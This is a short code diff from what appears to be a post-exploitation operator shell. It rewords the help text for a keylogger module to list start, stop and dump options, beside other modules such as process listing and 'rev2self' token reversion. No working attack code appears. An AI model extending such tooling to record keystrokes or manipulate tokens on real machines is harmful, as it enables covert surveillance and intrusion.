@@ -460,7 +460,7 @@ class OperatorShell:
             "ps": {"desc": "List running processes", "args": False},
             "ls": {"desc": "Directory listing", "args": True},
             "cat": {"desc": "Read file contents", "args": True},
-            "keylogger": {"desc": "Start/stop keystroke logger", "args": True},
+            "keylogger": {"desc": "Keystroke logger (start|stop|dump)", "args": True},
             "rev2self": {"desc": "Revert to process token", "args": False},
         }
         if cmd in native_modules:
